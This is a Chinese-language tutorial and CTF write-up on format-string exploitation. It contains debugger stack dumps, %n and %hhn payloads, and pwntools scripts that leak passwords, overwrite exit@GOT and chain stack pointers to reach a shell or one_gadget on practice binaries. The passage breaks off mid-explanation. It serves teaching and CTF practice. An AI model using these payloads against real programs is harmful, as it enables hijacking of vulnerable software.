#include &lt;stdio.h&gt;int main()&#123;    int a = 10;    printf(&quot;The value of a is %1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p\n&quot;);    return 0;&#125;
另外对于64位程序，优先使用6个寄存器传参（rdi,rsi,rdx,rcx,r8,r9），多的再以栈传参，而32位程序使用栈传参
对于上面的程序，运行printf前
*RAX  0 RBX  0x7fffffffdc88 —▸ 0x7fffffffdf47 ◂— &#x27;/home/ubuntu/pragramming/test/test&#x27; RCX  0x555555557dc0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555100 (__do_global_dtors_aux) ◂— endbr64 RDX  0x7fffffffdc98 —▸ 0x7fffffffdf6a ◂— &#x27;HOSTTYPE=x86_64&#x27; RDI  0x555555556008 ◂— &#x27;The value of a is %1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p\n&#x27; RSI  0x7fffffffdc88 —▸ 0x7fffffffdf47 ◂— &#x27;/home/ubuntu/pragramming/test/test&#x27; R8   0 R9   0x7ffff7fca380 (_dl_fini) ◂— endbr64 R10  0x7fffffffd880 ◂— 0x800000 R11  0x203 R12  1 R13  0 R14  0x555555557dc0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555100 (__do_global_dtors_aux) ◂— endbr64 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f RBP  0x7fffffffdb60 —▸ 0x7fffffffdc00 —▸ 0x7fffffffdc60 ◂— 0 RSP  0x7fffffffdb50 —▸ 0x7fffffffdc40 —▸ 0x555555555060 (_start) ◂— endbr64*RIP  0x55555555516b (main+34) ◂— call printf@plt---------------------------------------------------------------------------------------------------------------------00:0000│ rsp 0x7fffffffdb50 —▸ 0x7fffffffdc40 —▸ 0x555555555060 (_start) ◂— endbr6401:0008│-008 0x7fffffffdb58 ◂— 0xaffffdc8802:0010│ rbp 0x7fffffffdb60 —▸ 0x7fffffffdc00 —▸ 0x7fffffffdc60 ◂— 003:0018│+008 0x7fffffffdb68 —▸ 0x7ffff7c2a1ca (__libc_start_call_main+122) ◂— mov edi, eax04:0020│+010 0x7fffffffdb70 —▸ 0x7fffffffdbb0 —▸ 0x555555557dc0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555100 (__do_global_dtors_aux) ◂— endbr6405:0028│+018 0x7fffffffdb78 —▸ 0x7fffffffdc88 —▸ 0x7fffffffdf47 ◂— &#x27;/home/ubuntu/pragramming/test/test&#x27;06:0030│+020 0x7fffffffdb80 ◂— 0x15555404007:0038│+028 0x7fffffffdb88 —▸ 0x555555555149 (main) ◂— endbr64
打印的是
The value of a is 0x7fffffffdc88 0x7fffffffdc98 0x555555557dc0 (nil) 0x7ffff7fca380 0x7fffffffdc40 0xaffffdc88 0x7fffffffdc00 0x7ffff7c2a1ca
分别是rsi,rdx,rcx,r8,r9,[rsp],[rsp+0x8],[rsp+0x10],[rsp+0x18]
使用其他形如%k$p的格式化字符串参数可以泄露栈地址，libc地址（栈上常有的03:0018│+008 0x7fffffffdb68 —▸ 0x7ffff7c2a1ca (__libc_start_call_main+122)），堆地址等等，可以绕过PIE（也称ASLR）
使用%n，%hn，%hhn可以实现任意地址写，注意任意写是向栈上的一个地址里面写，而不是直接在栈上写
补充一下%s也是泄露栈上的一个地址中的数据
比如
#include &lt;stdio.h&gt;int main()&#123;    int a = 10,b = 10;    printf(&quot;%1c%7$n\n&quot;);    printf(&quot;%d %d&quot;,a,b);    return 0;&#125;
 ► 0x555555555172 &lt;main+41&gt;    call   printf@plt                  &lt;printf@plt&gt;        format: 0x555555556004 ◂— 0x6e243725633125 /* &#x27;%1c%7$n&#x27; */        vararg: 0x7fffffffdc88 —▸ 0x7fffffffdf47 ◂— &#x27;/home/ubuntu/pragramming/test/test&#x27;--------------------------------------------------------------------------------------------------------------------------00:0000│ rsp 0x7fffffffdb50 —▸ 0x7fffffffdc40 —▸ 0x555555555060 (_start) ◂— endbr6401:0008│-008 0x7fffffffdb58 ◂— 0xa0000000a /* &#x27;\n&#x27; */02:0010│ rbp 0x7fffffffdb60 —▸ 0x7fffffffdc00 —▸ 0x7fffffffdc60 ◂— 003:0018│+008 0x7fffffffdb68 —▸ 0x7ffff7c2a1ca (__libc_start_call_main+122) ◂— mov edi, eax04:0020│+010 0x7fffffffdb70 —▸ 0x7fffffffdbb0 —▸ 0x555555557dc0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555100 (__do_global_dtors_aux) ◂— endbr6405:0028│+018 0x7fffffffdb78 —▸ 0x7fffffffdc88 —▸ 0x7fffffffdf47 ◂— &#x27;/home/ubuntu/pragramming/test/test&#x27;06:0030│+020 0x7fffffffdb80 ◂— 0x15555404007:0038│+028 0x7fffffffdb88 —▸ 0x555555555149 (main) ◂— endbr64--------------------------------------------------------------------------------------------------------------------------ni-------------------------------------------------------------------------------------------------------------------------- ► 0x7ffff7c68cc3 &lt;printf_positional+6755&gt;    mov    dword ptr [rbx], eax     &lt;Cannot dereference [0xa0000000a]&gt;
0xa0000000a是非法内存，不能向这里写，所以产生了段错误
要想改动a,b的值
首先要有一个双连指针形如A-&gt;0x7fffffffdb58 ◂— 0xa0000000a
比如
#include &lt;stdio.h&gt;int main()&#123;    int a = 10,b = 10;    long long *p=&amp;b;    printf(&quot;%1c%8$n&quot;);    printf(&quot;%d %d&quot;,a,b);    return 0;&#125;
这样产生了一个双连指针
00:0000│ rsp 0x7fffffffdb40 ◂— 001:0008│-018 0x7fffffffdb48 ◂— 0xa0000000a /* &#x27;\n&#x27; */02:0010│-010 0x7fffffffdb50 —▸ 0x7fffffffdb48 ◂— 0xa0000000a /* &#x27;\n&#x27; */03:0018│-008 0x7fffffffdb58 ◂— 0x318b267389bb120004:0020│ rbp 0x7fffffffdb60 —▸ 0x7fffffffdc00 —▸ 0x7fffffffdc60 ◂— 005:0028│+008 0x7fffffffdb68 —▸ 0x7ffff7c2a1ca (__libc_start_call_main+122) ◂— mov edi, eax06:0030│+010 0x7fffffffdb70 —▸ 0x7fffffffdbb0 —▸ 0x555555557db8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555120 (__do_global_dtors_aux) ◂— endbr6407:0038│+018 0x7fffffffdb78 —▸ 0x7fffffffdc88 —▸ 0x7fffffffdf46 ◂— &#x27;/home/ubuntu/pragramming/test/test&#x27;
注意到0x7fffffffdb50 —▸ 0x7fffffffdb48 ◂— 0xa0000000a /* '\n' */
对这个地址0x7fffffffdb50使用%n就行了
► 0x5555555551a9 &lt;main+64&gt;    call   printf@plt                  &lt;printf@plt&gt;       format: 0x555555556004 ◂— 0x6e243825633125 /* &#x27;%1c%8$n&#x27; */       vararg: 0x7fffffffdc88 —▸ 0x7fffffffdf46 ◂— &#x27;/home/ubuntu/pragramming/test/test&#x27;
可以发现
00:0000│ rsp 0x7fffffffdb40 ◂— 001:0008│-018 0x7fffffffdb48 ◂— 0xa0000000102:0010│-010 0x7fffffffdb50 —▸ 0x7fffffffdb48 ◂— 0xa0000000103:0018│-008 0x7fffffffdb58 ◂— 0x318b267389bb120004:0020│ rbp 0x7fffffffdb60 —▸ 0x7fffffffdc00 —▸ 0x7fffffffdc60 ◂— 005:0028│+008 0x7fffffffdb68 —▸ 0x7ffff7c2a1ca (__libc_start_call_main+122) ◂— mov edi, eax06:0030│+010 0x7fffffffdb70 —▸ 0x7fffffffdbb0 —▸ 0x555555557db8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555120 (__do_global_dtors_aux) ◂— endbr6407:0038│+018 0x7fffffffdb78 —▸ 0x7fffffffdc88 —▸ 0x7fffffffdf46 ◂— &#x27;/home/ubuntu/pragramming/test/test&#x27;
实际利用有

利用栈上的__libc_start_call_main的地址算出libc基址
泄露canary达到绕过canary保护
修改数据
修改函数指针

等等
课堂程序
这是一个32位程序，直接用栈传参
#include &lt;stdio.h&gt;void main(int argc, char ** argv)&#123;   char buff[36] = &#123;0&#125;;   int a = 0;   int b = 0;   FILE *fp;   char ch;   if( (fp = fopen(argv[1], &quot;r&quot;)) != NULL )	fread(buff, 32, 1, fp);   printf(&quot;the addresses of a b buf are %x,%x,%x\n&quot;, &amp;a, &amp;b, buff);   a = 0;   printf(buff);   printf(&quot;a= %d\n&quot;, a);   if(fp)      fclose(fp);&#125;
a的地址有了
pwndbg&gt;the addresses of a b buf are ffffccdc,ffffcce0,ffffcce8
printf(buff)前
00:0000│ esp 0xffffccb0 —▸ 0xffffcce8 ◂— &#x27;%2025c%1$n&#x27;01:0004│-064 0xffffccb4 —▸ 0xffffccdc ◂— 002:0008│-060 0xffffccb8 —▸ 0xffffcce0 ◂— 003:000c│-05c 0xffffccbc —▸ 0xffffcce8 ◂— &#x27;%2025c%1$n&#x27;
a的地址刚好在第一个参数，还有一个双连指针！！！
还说什么了
直接向这里写
printf后
00:0000│ esp 0xffffccb0 —▸ 0xffffcce8 ◂— &#x27;%2025c%1$n&#x27;01:0004│-064 0xffffccb4 —▸ 0xffffccdc ◂— 0x7e902:0008│-060 0xffffccb8 —▸ 0xffffcce0 ◂— 003:000c│-05c 0xffffccbc —▸ 0xffffcce8 ◂— &#x27;%2025c%1$n&#x27;
完美符合要求
 ~/pragramming  ./vul inthe addresses of a b buf are ff8eacac,ff8eacb0,ff8eacb8                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        �a= 2025
泄露的利用
对于这个程序（Moectf2025 fmt）
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  char *s2_1; // [rsp+8h] [rbp-88h]  char s1[16]; // [rsp+10h] [rbp-80h] BYREF  char s2[16]; // [rsp+20h] [rbp-70h] BYREF  char s[88]; // [rsp+30h] [rbp-60h] BYREF  unsigned __int64 v8; // [rsp+88h] [rbp-8h]  v8 = __readfsqword(0x28u);  init(argc, argv, envp);  s2_1 = (char *)malloc(0x20uLL);  generate(s2, 5LL);  generate(s2_1, 5LL);  puts(&quot;Hey there, little one, what&#x27;s your name?&quot;);  fgets(s, 80, stdin);  printf(&quot;Nice to meet you,&quot;);  printf(s);  puts(&quot;I buried two treasures on the stack.Can you find them?&quot;);  fgets(s1, 8, stdin);  if ( strncmp(s1, s2, 5uLL) )    lose();  puts(&quot;Yeah,another one?&quot;);  fgets(s1, 8, stdin);  if ( strncmp(s1, s2_1, 5uLL) )    lose();  win();  return 0;&#125;
unsigned __int64 __fastcall generate(__int64 a1, unsigned __int64 i_1)&#123;  unsigned __int64 i; // [rsp+18h] [rbp-48h]  char abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[56]; // [rsp+20h] [rbp-40h] BYREF  unsigned __int64 v5; // [rsp+58h] [rbp-8h]  v5 = __readfsqword(0x28u);  strcpy(abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ, &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;);  for ( i = 0LL; i &lt; i_1; ++i )    *(_BYTE *)(a1 + i) = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[(int)arc4random_uniform(52LL)];  *(_BYTE *)(a1 + i_1) = 0;  return v5 - __readfsqword(0x28u);&#125;
int win()&#123;  puts(&quot;You got it!&quot;);  return system(&quot;/bin/sh&quot;);&#125;
运行完generate后
00:0000│ rsp 0x7ffcc2f736c0 ◂— 0xc00001:0008│-088 0x7ffcc2f736c8 —▸ 0x654944ad82a0 ◂— 0x4e4c654b67 /* &#x27;gKeLN&#x27; */02:0010│-080 0x7ffcc2f736d0 ◂— 0x1b0000003:0018│-078 0x7ffcc2f736d8 ◂— 0x30000004:0020│-070 0x7ffcc2f736e0 ◂— 0x4e6966444f /* &#x27;ODfiN&#x27; */05:0028│-068 0x7ffcc2f736e8 —▸ 0x7ffcc2f73718 ◂— 006:0030│-060 0x7ffcc2f736f0 ◂— 0xc50000000607:0038│-058 0x7ffcc2f736f8 ◂— 0
可以看到一个密码储存在一个地址处，可以用%s泄露，另一个密码就是栈上的地址，可以用%p泄露
计算好偏移并利用格式化字符串漏洞
接收泄露的密码，再发送出去就可以了
p = start()p.recvuntil(b&quot;Hey there, little one, what&#x27;s your name?\n&quot;)payload=b&#x27;A&#x27;*8+b&#x27;%7$s&#x27;+b&#x27;%10$p&#x27;p.sendline(payload)p.recvuntil(b&quot;Nice to meet you,&quot;)p.recvuntil(b&#x27;A&#x27;*8)s2_1= p.recv(5)hex_str=p.recv(12)hex_int = int(hex_str, 16)byte_data = hex_int.to_bytes(length=5, byteorder=&#x27;little&#x27;)s2 = byte_data.decode(&#x27;ascii&#x27;, errors=&#x27;ignore&#x27;)p.recvuntil(b&quot;I buried two treasures on the stack.Can you find them?\n&quot;)p.sendline(s2)p.recvuntil(b&quot;Yeah,another one?\n&quot;)p.sendline(s2_1)p.interactive()
栈上构造地址形成双连指针
以Whu2025迎新赛的格式化字符串漏洞题举例
原本没有指向需要修改的地址的指针
那么在知道地址的情况下可以在输入内构造地址（注意地址的对齐）
然后偏移指向构造的地址
对于攻击payload=b'%214c%11$hhn'+b'%59c%12$hhn' +b'%47c%13$hhn'+b'aaaaaa'+p64(addr)+ p64(addr+1)+p64(addr+2)
printf前
 ► 0x401286 &lt;main+150&gt;    call   printf@plt                  &lt;printf@plt&gt;        format: 0x7ffe55316750 ◂— &#x27;%214c%11$hhn%59c%12$hhn%47c%13$hhnaaaaaa@@@&#x27;        vararg: 0x7ffe55316750 ◂— &#x27;%214c%11$hhn%59c%12$hhn%47c%13$hhnaaaaaa@@@&#x27;--------------------------------------------------------------------------------------------------------------------------00:0000│ rdi rsi rsp 0x7ffe55316750 ◂— &#x27;%214c%11$hhn%59c%12$hhn%47c%13$hhnaaaaaa@@@&#x27;01:0008│-108         0x7ffe55316758 ◂— &#x27;$hhn%59c%12$hhn%47c%13$hhnaaaaaa@@@&#x27;02:0010│-100         0x7ffe55316760 ◂— &#x27;%12$hhn%47c%13$hhnaaaaaa@@@&#x27;03:0018│-0f8         0x7ffe55316768 ◂— &#x27;47c%13$hhnaaaaaa@@@&#x27;04:0020│-0f0         0x7ffe55316770 ◂— &#x27;hnaaaaaa@@@&#x27;05:0028│-0e8         0x7ffe55316778 —▸ 0x404040 (exit@got[plt]) —▸ 0x401080 ◂— endbr6406:0030│-0e0         0x7ffe55316780 —▸ 0x404041 (exit@got[plt]+1) ◂— 0x401007:0038│-0d8         0x7ffe55316788 —▸ 0x404042 (exit@got[plt]+2) ◂— 0x40 /* &#x27;@&#x27; */
printf后
 ► 0x401290 &lt;main+160&gt;    call   exit@plt                    &lt;exit@plt&gt;        status: 0--------------------------------------------------------------------------------------------------------------------------00:0000│ rsp 0x7ffe55316750 ◂— &#x27;%214c%11$hhn%59c%12$hhn%47c%13$hhnaaaaaa@@@&#x27;01:0008│-108 0x7ffe55316758 ◂— &#x27;$hhn%59c%12$hhn%47c%13$hhnaaaaaa@@@&#x27;02:0010│-100 0x7ffe55316760 ◂— &#x27;%12$hhn%47c%13$hhnaaaaaa@@@&#x27;03:0018│-0f8 0x7ffe55316768 ◂— &#x27;47c%13$hhnaaaaaa@@@&#x27;04:0020│-0f0 0x7ffe55316770 ◂— &#x27;hnaaaaaa@@@&#x27;05:0028│-0e8 0x7ffe55316778 —▸ 0x404040 (exit@got[plt]) —▸ 0x4011d6 (backdoor) ◂— endbr6406:0030│-0e0 0x7ffe55316780 —▸ 0x404041 (exit@got[plt]+1) ◂— 0x401107:0038│-0d8 0x7ffe55316788 —▸ 0x404042 (exit@got[plt]+2) ◂— 0x40 /* &#x27;@&#x27; */
在调用exit是就会调用backdoor
io = start() io.recvuntil(b&#x27;What do you want to do?\n&#x27;)addr=0x404040payload=b&#x27;%214c%11$hhn&#x27;+b&#x27;%59c%12$hhn&#x27; +b&#x27;%47c%13$hhn&#x27;+b&#x27;aaaaaa&#x27;+p64(addr)+ p64(addr+1)+p64(addr+2) io.sendline(payload)io.interactive()
非栈上格式化字符串漏洞的利用
以Moectf2025 fmt_s举例
这里我们利用的是三连指针
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int i; // [rsp+Ch] [rbp-4h]  init(argc, argv, envp);  puts(&quot;You&#x27;re walking down the road when a monster appear.&quot;);  for ( i = 1; i &lt;= 3 &amp;&amp; !flag; ++i )    talk();  if ( (unsigned __int64)atk &lt;= 0x1BF52 )    puts(&quot;You&#x27;ve been eaten by the monster.&quot;);  else    he();  return 0;&#125;
__int64 talk()&#123;  puts(&quot;You start talking to him...&quot;);  flag ^= 1u;  read(0, fmt, 0x20uLL);  printf(fmt);  puts(&quot;?&quot;);  puts(&quot;You enraged the monster-prepare for battle!&quot;);  return my_read(&amp;atk, 8LL);&#125;
unsigned __int64 he()&#123;  char command[6]; // [rsp+2h] [rbp-Eh] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  qmemcpy(command, &quot;a_flag&quot;, sizeof(command));  puts(&quot;The monster is defeated, and you obtain: flag?&quot;);  system(command);  return v2 - __readfsqword(0x28u);
fmt写入在bss段上，属于一道非栈上格式化字符串漏洞题
.bss:00000000004040A0                 public atk.bss:00000000004040A0 atk             dq ?                    ; DATA XREF: talk+7A↑o.bss:00000000004040A0                                         ; main:loc_4013BE↑r.bss:00000000004040A8                 public flag.bss:00000000004040A8 flag            dd ?                    ; DATA XREF: talk+1B↑r.bss:00000000004040A8                                         ; talk+24↑w ....bss:00000000004040AC                 align 20h.bss:00000000004040C0                 public fmt.bss:00000000004040C0 ; char fmt[256].bss:00000000004040C0 fmt             db 100h dup(?)          ; DATA XREF: talk+2F↑o.bss:00000000004040C0                                         ; talk+43↑o.bss:00000000004040C0 _bss            ends
没有后门函数，最好的方法就是使用one_gadget，修改返回地址来达到劫持程序的目的
非栈上格式化字符串一般是打一个指针串，就是先修改一个指针指向可以修改的地方，然后修改这个指针指向的指针的内容
00:0000 |  rsp 0x7ffd9784e118 → 0x40127c (vuln+101) ← lea rax, [rip + 0x2ddd]01:0008 | -010 0x7ffd9784e120 → 0x40129e (main) ← endbr6402:0010 | -008 0x7ffd9784e128 ← 0x3004011fa03:0018 |  rbp 0x7ffd9784e130 → 0x7ffd9784e140 ← 104:0020 | +008 0x7ffd9784e138 → `0x4012ba (main+28)` ← mov eax, 005:0028 | +010 0x7ffd9784e140 ← 106:0030 | +018 0x7ffd9784e148 → 0x7fecc58f6d90 (__libc_start_call_main+128) ← mov edi, eax07:0038 | +020 0x7ffd9784e150 ← 008:0040 | +028 0x7ffd9784e158 → 0x40129e (main) ← endbr6409:0048 | +030 0x7ffd9784e160 ← 0x19784e2400a:0050 | +038 `0x7ffd9784e168 → 0x7ffd9784e258 → 0x7ffd9785011b` ← 0x4853006e77702f2e / * &#x27;./pwn&#x27; */0b:0058 | +040 0x7ffd9784e170 ← 00c:0060 | +048 0x7ffd9784e178 ← 0xe37404db4f04c1050d:0068 | +050 0x7ffd9784e180 → 0x7ffd9784e258 → 0x7ffd9785011b ← 0x4853006e77702f2e / * &#x27;./pwn&#x27; */0e:0070 | +058 0x7ffd9784e188 → 0x40129e (main) ← endbr640f:0078 | +060 0x7ffd9784e190 → 0x403db8 (__do_global_dtors_aux_fini_array_entry) → 0x401180 (__do_global_dtors_aux) ← endbr64
比如说，上面0x4012ba (main+28)是 vul 函数的返回地址，我们是不能直接修改这个值的
栈地址 –&gt;addr2–&gt;addr3，已知栈地址是第几个参数，我们能修改的是 addr3
栈上一般都有一些符合上述形式的链，如0a:0050 | +038 0x7ffd9784e168 → 0x7ffd9784e258 → 0x7ffd9785011b
我们可以修改 addr3 为 0x7ffd9784e138 (vul 函数返回地址在栈上的位置)
这样的话，我们只需要知道 addr2 是第几个参数，那么我们就可以通过 addr2–&gt;addr3–&gt;vul_ret_addr 来修改 vul 函数的返回地址
下面演示的是“诸葛连弩”的打法：
栈上一般都会有可以获得libc基地址的东西，比如说__libc_start_main
我们先来看看talk函数的栈内容吧
00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;01:0008│-008 0x7ffea6500678 —▸ 0x40136f (main) ◂— endbr6402:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 103:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 104:0020│+010 0x7ffea6500690 ◂— 0x100005:0028│+018 0x7ffea6500698 ◂— 0x10040111006:0030│+020 0x7ffea65006a0 ◂— 107:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax08:0040│+030 0x7ffea65006b0 ◂— 009:0048│+038 0x7ffea65006b8 —▸ 0x40136f (main) ◂— endbr640a:0050│+040 0x7ffea65006c0 ◂— 0x1a65007a00b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;0c:0060│+050 0x7ffea65006d0 ◂— 00d:0068│+058 0x7ffea65006d8 ◂— 0x6d26ff8a1914566c0e:0070│+060 0x7ffea65006e0 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;0f:0078│+068 0x7ffea65006e8 —▸ 0x40136f (main) ◂— endbr6410:0080│+070 0x7ffea65006f0 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr6411:0088│+078 0x7ffea65006f8 —▸ 0x7913edace040 (_rtld_global) —▸ 0x7913edacf2e0 ◂— 012:0090│+080 0x7ffea6500700 ◂— 0x92dbb32a1476566c13:0098│+088 0x7ffea6500708 ◂— 0x9f01248f239e566c14:00a0│+090 0x7ffea6500710 ◂— 0x79130000000015:00a8│+098 0x7ffea6500718 ◂— 0... ↓        3 skipped19:00c8│+0b8 0x7ffea6500738 ◂— 0xb0add8007ab876001a:00d0│+0c0 0x7ffea6500740 ◂— 01b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]1c:00e0│+0d0 0x7ffea6500750 —▸ 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— &#x27;SHELL=/bin/bash&#x27;1d:00e8│+0d8 0x7ffea6500758 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr641e:00f0│+0e0 0x7ffea6500760 —▸ 0x7913edacf2e0 ◂— 01f:00f8│+0e8 0x7ffea6500768 ◂— 020:0100│+0f0 0x7ffea6500770 ◂— 021:0108│+0f8 0x7ffea6500778 —▸ 0x401110 (_start) ◂— endbr6422:0110│+100 0x7ffea6500780 —▸ 0x7ffea65007b0 ◂— 123:0118│+108 0x7ffea6500788 ◂— 024:0120│+110 0x7ffea6500790 ◂— 025:0128│+118 0x7ffea6500798 —▸ 0x401135 (_start+37) ◂— hlt26:0130│+120 0x7ffea65007a0 —▸ 0x7ffea65007a8 ◂— 0x1c27:0138│+128 0x7ffea65007a8 ◂— 0x1c28:0140│+130 0x7ffea65007b0 ◂— 129:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;2a:0150│+140 0x7ffea65007c0 ◂— 02b:0158│+148 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— &#x27;SHELL=/bin/bash&#x27;2c:0160│+150 0x7ffea65007d0 —▸ 0x7ffea6502a24 ◂— &#x27;COLORTERM=truecolor&#x27;
从这里可以得到libc基址
1b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128)
偏移量是33，使用%33$p将地址输出出来并计算libc基址得到one_gadget地址
观察发现07:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax是主函数的返回地址
偏移量是13，使用%13$p将地址输出出来便于修改为one_gadget
再将rbp的地址打印出来，便于修改rbp来达成one_gadget实现条件
02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 1
偏移量是8，打印 0x7ffea65006a0，再减去0x20得到rbp地址
另外要不断执行talk利用漏洞，需要注意for ( i = 1; i &lt;= 3 &amp;&amp; !flag; ++i )
每次执行都有异或操作flag ^= 1u;
需要我们每次利用都要使flag为0，怎么修改呢？
观察到
.bss:00000000004040A0 atk             dq ?                    ; DATA XREF: talk+7A↑o.bss:00000000004040A0                                         ; main:loc_4013BE↑r.bss:00000000004040A8                 public flag.bss:00000000004040A8 flag            dd ?                    ; DATA XREF: talk+1B↑r.bss:00000000004040A8                                         ; talk+24↑w ...
return my_read(&amp;atk, 8LL);
atk可以覆盖flag，于是我使用fffffff0来将flag覆盖为0
我们还需要无限次操作，修改i是必要的，此时我们只剩下两次操作机会，相当于只能修改一次任意地址的任意内容
注意到i是栈上的，第一次我们修改一个三连以上指针的第三个指针为i的符号位地址，第二次利用第二个指针来修改i的内容
这是第二次read前
00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;01:0008│-008 0x7ffea6500678 ◂— 0x80040136f02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 103:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 104:0020│+010 0x7ffea6500690 ◂— 0x100005:0028│+018 0x7ffea6500698 ◂— 0x20040111006:0030│ r9  0x7ffea65006a0 ◂— 107:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax
可以看见
int i; // [rsp+Ch] [rbp-4h]与05:0028│+018 0x7ffea6500698 ◂— 0x200401110，这个2正是存放在主函数的栈上的i
所以地址是rbp+0x18，又因为要改的是符号位，所以地址是rbp+0x18+7
详细演示一下这段代码的作用
p.recvuntil(b&quot;You start talking to him...\n&quot;)payload2=b&quot;%&quot; + str(i_addr).encode(&quot;utf-8&quot;) + b&quot;c%17$hn\x00&quot;p.send(payload2)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload3=b&quot;%&quot; + str(0xff).encode(&quot;utf-8&quot;) + b&quot;c%47$hhn&quot;p.send(payload3)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)
关键的变化是
0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;
0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100
此时0x7ffea650069f指向的恰好是i的最高位地址05:0028│+018 0x7ffea6500698 ◂— 0x200401110
我们利用的是0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100
找到第二个指针29:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100
偏移量是47，我们就可以利用这个来修改我们i的最高位了
关键的变化是
05:0028│+018 0x7ffea6500698 ◂— 0x300401110
05:0028│+018 0x7ffea6500698 ◂— 0xff00000300401110
可以看到我们已经实现了无限写
下面的修改也是一模一样
就可以实现劫持程序执行one_gadget
无printf(buf)的格式化字符串漏洞
以Whuctf2025新生赛的girlfriend举例
劫持puts的got表成printf，由安全的puts(buf)到危险的printf(buf)
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  int n4; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v4; // [rsp+8h] [rbp-8h]  v4 = __readfsqword(0x28u);  sub_1349(a1, a2, a3);  while ( 1 )  &#123;    sub_179C();    __isoc99_scanf(&quot;%d&quot;, &amp;n4);    getchar();    if ( n4 &gt; 4 || n4 &lt;= 0 )      break;    switch ( n4 )    &#123;      case 4:        sub_1ADB();        puts(&quot;Looks like you&#x27;re still in the dream.&quot;);        break;      case 3:        sub_1A33();        break;      case 1:        sub_1801();        break;      default:        sub_1903();        break;    &#125;  &#125;  puts(&quot;Hey, what are you doing?&quot;);  exit(1);&#125;
 ~/Whuctf/girlfriend  checksec pwn                                                                                         [*] &#x27;/home/ubuntu/Whuctf/girlfriend/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        PIE enabled    SHSTK:      Enabled    IBT:        Enabled
保护几乎全开，只有Partial RELRO，很有概率GOT劫持，但是不知道劫持什么
先关了地址随机化进行调试
void sub_1A33()&#123;  char *s1; // [rsp+8h] [rbp-8h]  s1 = (char *)malloc(0x10uLL);  puts(&quot;It looks like your girlfriend doesn not want to talk to you.&quot;);  puts(&quot;Maybe you should add something special. Then she will tell you her name.&quot;);  sub_1615(s1 + 8, 8LL);  if ( !strncmp(s1, &quot;iloveuiloveu&quot;, 0xCuLL) )  &#123;    puts(&quot;she loves you as well.&quot;);    printf(&quot;%p&quot;, &amp;unk_40B8);  &#125;  free(s1);&#125;
只要s1与iloveuiloveu相同就可以得到elf基地址，在这个函数可以改后4个字节
还需要改前面8个字节
